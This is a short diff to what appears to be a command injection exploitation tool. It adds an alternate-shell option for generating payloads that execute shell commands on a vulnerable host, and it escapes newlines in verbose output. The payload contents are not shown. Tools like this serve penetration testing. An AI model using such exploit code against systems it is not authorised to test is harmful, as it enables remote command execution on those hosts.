@@ -121,10 +121,13 @@ def injection_test(payload,http_request_method,url):
 #----------------------------------------------
 # The main command injection exploitation.
 #----------------------------------------------
-def injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE):
+def injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
   
   # Execute shell commands on vulnerable host.
-  payload = fb_payloads.cmd_execution(separator,cmd,OUTPUT_TEXTFILE) 
+  if alter_shell :
+    payload = fb_payloads.cmd_execution_alter_shell(separator,cmd,OUTPUT_TEXTFILE) 
+  else:
+    payload = fb_payloads.cmd_execution(separator,cmd,OUTPUT_TEXTFILE) 
   
   # Check if defined "--prefix" option.
   if menu.options.prefix:
@@ -142,7 +145,7 @@ def injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vu
       
   # Check if defined "--verbose" option.
   if menu.options.verbose:
-    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+    sys.stdout.write("\n" + colors.GREY + payload.replace("\n","\\n") + colors.RESET)
 		    
   # Check if defined method is GET (Default).
   if http_request_method == "GET":
